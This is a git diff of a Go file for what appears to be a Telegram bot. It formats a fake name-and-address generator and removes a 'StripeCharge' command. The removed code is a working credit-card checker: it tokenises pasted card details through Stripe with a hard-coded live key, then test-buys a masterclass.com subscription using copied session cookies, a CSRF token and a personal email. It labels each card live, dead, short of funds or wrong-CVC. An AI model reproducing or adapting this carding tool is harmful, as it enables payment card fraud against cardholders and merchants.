@@ -455,106 +455,12 @@ func Fake_gen(c tb.Context) error {
 			}
 		}
 	}
-	msg := fmt.Sprintf("<b>Fake Address Gen</b>\n<b>Full Name:</b> %s\n<b>Gender:</b> %s\n<b>DOB:</b> %s\n<b>Street:</b> %s\n<b>City/Town:</b> %s\n<b>State:</b> %s\n<b>Zip:</b> %s\n<b>Country:</b> %s\n<b>Phone Number:</b> %s", fname, gen, bday, street, city, state, zip, country, num)
+	msg := fmt.Sprintf("<b>Fake Address Gen</b>\n<b>Full Name:</b> <code>%s</code>\n<b>Gender:</b> <code>%s</code>\n<b>DOB:</b> <code>%s</code>\n<b>Street:</b> <code>%s</code>\n<b>City/Town:</b> <code>%s</code>\n<b>State:</b> <code>%s</code>\n<b>Zip:</b> <code>%s</code>\n<b>Country:</b> <code>%s</code>\n<b>Phone Number:</b> <code>%s</code>", fname, gen, bday, street, city, state, zip, country, num)
 	c.Reply(msg)
 	return nil
 }
 
 func YT_search(c tb.Context) error {
-	return nil
-}
-
-func StripeCharge(c tb.Context) error {
-	return c.Reply("Gate Maintenance.")
-	d := strings.TrimSpace(c.Message().Payload)
-	cc, year, month, cvc := "", "", "", ""
-	for i, x := range strings.SplitN(d, "|", -1) {
-		if i == 0 {
-			cc = x
-		} else if i == 1 {
-			month = x
-		} else if i == 2 {
-			year = x
-		} else if i == 3 {
-			cvc = x
-		}
-	}
-	for _, x := range []string{cc, year, month, cvc} {
-		if x == string("") {
-			c.Reply("Invalid format, please send as <code>/st cc|mm|yy|cvv</code>")
-			return nil
-		}
-	}
-	client := &http.Client{}
-	current_time := time.Now()
-	var postdata = strings.NewReader(fmt.Sprintf(`card[number]=%s&card[cvc]=%s&card[exp_month]=%s&card[exp_year]=%s`, cc, cvc, month, year) + `&guid=73f5a9dc-4f9d-4102-9f39-112d2bc87189f08893&muid=48d7d431-4532-4771-ad19-b3c4f6f9a71fb97291&sid=d61644dc-b7f0-456b-8669-e4aeff5cae0f629bec&payment_user_agent=stripe.js%2F558e252d7%3B+stripe-js-v3%2F558e252d7&time_on_page=1319401&key=pk_live_O98c9ngrjsN9aCgHLae6hqHU&pasted_fields=number`)
-	requ, _ := http.NewRequest("POST", "https://api.stripe.com/v1/tokens", postdata)
-	requ.Header.Set("authority", "api.stripe.com")
-	requ.Header.Set("sec-ch-ua", `"Chromium";v="96", "Opera";v="82", ";Not A Brand";v="99"`)
-	requ.Header.Set("accept", "application/json")
-	requ.Header.Set("content-type", "application/x-www-form-urlencoded")
-	requ.Header.Set("sec-ch-ua-mobile", "?0")
-	requ.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.58")
-	requ.Header.Set("sec-ch-ua-platform", `"Linux"`)
-	requ.Header.Set("origin", "https://js.stripe.com")
-	requ.Header.Set("sec-fetch-site", "same-site")
-	requ.Header.Set("sec-fetch-mode", "cors")
-	requ.Header.Set("sec-fetch-dest", "empty")
-	requ.Header.Set("referer", "https://js.stripe.com/")
-	requ.Header.Set("accept-language", "en-US,en;q=0.9")
-	res, err := client.Do(requ)
-	check(err)
-	defer res.Body.Close()
-	var stripe bson.M
-	json.NewDecoder(res.Body).Decode(&stripe)
-	card_token, ok := stripe["id"].(string)
-	if !ok {
-		return c.Reply(fmt.Sprint(stripe))
-	}
-	var data = strings.NewReader(fmt.Sprintf(`{"payment_type":"stripe","token":"%s","coupon":null,"save_card":true,"credit_card_id":null,"regionInfo":{"clientTcpRtt":16,"longitude":"75.77210","latitude":"11.24480","tlsCipher":"AEAD-AES128-GCM-SHA256","continent":"AS","asn":138754,"clientAcceptEncoding":"gzip, deflate, br","country":"IN","tlsClientAuth":{"certIssuerDNLegacy":"","certIssuerSKI":"","certSubjectDNRFC2253":"","certSubjectDNLegacy":"","certFingerprintSHA256":"","certNotBefore":"","certSKI":"","certSerial":"","certIssuerDN":"","certVerified":"NONE","certNotAfter":"","certSubjectDN":"","certPresented":"0","certRevoked":"0","certIssuerSerial":"","certIssuerDNRFC2253":"","certFingerprintSHA1":""},"tlsExportedAuthenticator":{"clientFinished":"8255604b0f38040d2f0559f28bbfdab14a03556da66f9de6cdc818e9ab2da9c6","clientHandshake":"a0935c8ad4a89d3f13dd1eccb660dabbee5b298c712ae658228ba641289a41e4","serverHandshake":"0be4363d7771a91e6407ced19c8662ce49510ac46dc3333302691c58a56a7ce8","serverFinished":"5e078e7242993644c6b99c1d5b643932aede4adcbb76372616e38148ec47ba3c"},"tlsVersion":"TLSv1.3","colo":"MAA","timezone":"Asia/Kolkata","city":"Kozhikode","httpProtocol":"HTTP/2","edgeRequestKeepAliveStatus":1,"requestPriority":"weight=220;exclusive=1","botManagement":{"ja3Hash":"cd08e31494f9531f560d64c695473da9","staticResource":false,"verifiedBot":false,"score":34},"clientTrustScore":34,"region":"Kerala","regionCode":"MH","asOrganization":"Kerala Vision Broad Band Private Limited","postalCode":"673004"},"email":"camarnath500@gmail.com","products":[304]}`, card_token))
-	req, err := http.NewRequest("POST", "https://www.masterclass.com/api/v2/orders", data)
-	check(err)
-	req.Header.Set("authority", "www.masterclass.com")
-	req.Header.Set("sec-ch-ua", `"Chromium";v="96", "Opera";v="82", ";Not A Brand";v="99""`)
-	req.Header.Set("content-type", "application/json; charset=UTF-8")
-	req.Header.Set("x-csrf-token", "P04cdV9CTN6EiDZdBu7qou4gOQgSpVBzUfQ1jxkQxHPYDdhRR6KS37H15c/fYevAowoL+KglNj2a+c8q3BEZzg==")
-	req.Header.Set("sec-ch-ua-mobile", "?0")
-	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.58")
-	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
-	req.Header.Set("accept", "*/*")
-	req.Header.Set("origin", "https://www.masterclass.com")
-	req.Header.Set("sec-fetch-site", "same-origin")
-	req.Header.Set("sec-fetch-mode", "cors")
-	req.Header.Set("sec-fetch-dest", "empty")
-	req.Header.Set("referer", "https://www.masterclass.com/plans")
-	req.Header.Set("accept-language", "en-US,en;q=0.9")
-	req.Header.Set("cookie", "ajs_anonymous_id=%22rails-gen-95edfa57-b35a-4123-af07-a7059b0d8d81%22; first_visit=1; first_session=1; first_visit_on=2022-01-22; _session_id=80fa49d7db9128d509bd2ef301356c42; track_visit_session_id=f36cd6b3-b235-49ba-affc-be4298be1172; gdpr_checked=true; checkout_product_tiers_plan={%22name%22:%22Standard%22%2C%22price%22:{%22annual%22:%22%E2%82%B915%2C540%22%2C%22monthly%22:%22%E2%82%B91%2C295%22%2C%22flatRate%22:1554000%2C%22id%22:304}%2C%22id%22:304}; mc_cart=%5B%7B%22id%22%3A304%2C%22cart_exclusive%22%3Atrue%2C%22open_as_gift%22%3Afalse%7D%5D; cart_email=%22camarnath563%40gmail.com%22; __stripe_mid=48d7d431-4532-4771-ad19-b3c4f6f9a71fb97291; __stripe_sid=d61644dc-b7f0-456b-8669-e4aeff5cae0f629bec; _mcl=1; splitter_subject_id=8097400; split=%7B%22falcon_personalization_standalone%22%3A%22variation%22%2C%22post_pw_tv_my_progress%22%3A%22variation%22%2C%22checkout_modal_recently_viewed_instructor_avatars_disco_7_v1%22%3A%22variant_1%22%2C%22boso21_bipartisan_approach_cm%22%3A%22variant_2%22%2C%22announcement_tile_course_duration_disco_213_v1%22%3A%22variant_2%22%2C%22boso21_gift_hero_revamp%22%3A%22variant_1%22%2C%22course_impact_survey%22%3A%22variant_1%22%7D; __cf_bm=nermHfFb5_OdQdSr4IxzlHvbSuU7ywz1cPZuwtckv0E-1642827498-0-AdfMcVDHwL/WYIJ/vP+UBGEx8mmcLVctoEFIXU4sA04jL5x2QqW5qYAmdsVteuci1NJzDMvQHtwcD8KwU/atj30=")
-	resp, err := client.Do(req)
-	check(err)
-	defer resp.Body.Close()
-	var r bson.M
-	json.NewDecoder(resp.Body).Decode(&r)
-	bin := GetBin(cc, 1)
-	total_time := time.Now().Unix() - current_time.Unix()
-	status := "Free User"
-	if c.Sender().ID == int64(1833850637) {
-		status = "Master"
-	} else if c.Sender().ID == int64(2034353498) {
-		status = "Maccha"
-	}
-	if r["error"] != nil {
-		if r["error"].(map[string]interface{})["message"].(string) == "Your card has insufficient funds." {
-			c.Reply(fmt.Sprintf(insuf_funds, cc, month, year, cvc, r["error"].(map[string]interface{})["code"].(string), bin, total_time, c.Sender().ID, c.Sender().FirstName, status))
-		} else if r["error"].(map[string]interface{})["code"].(string) == "card_declined" {
-			c.Reply(fmt.Sprintf(dead_cc, cc, month, year, cvc, r["error"].(map[string]interface{})["message"].(string), bin, total_time, c.Sender().ID, c.Sender().FirstName, status))
-		} else if r["error"].(map[string]interface{})["code"].(string) == "incorrect_cvc" {
-			c.Reply(fmt.Sprintf(ccn_cc, cc, month, year, cvc, r["error"].(map[string]interface{})["message"].(string), bin, total_time, c.Sender().ID, c.Sender().FirstName, status))
-		} else {
-			c.Reply(fmt.Sprint(r))
-		}
-	} else {
-		c.Reply(fmt.Sprint(r))
-	}
 	return nil
 }
 
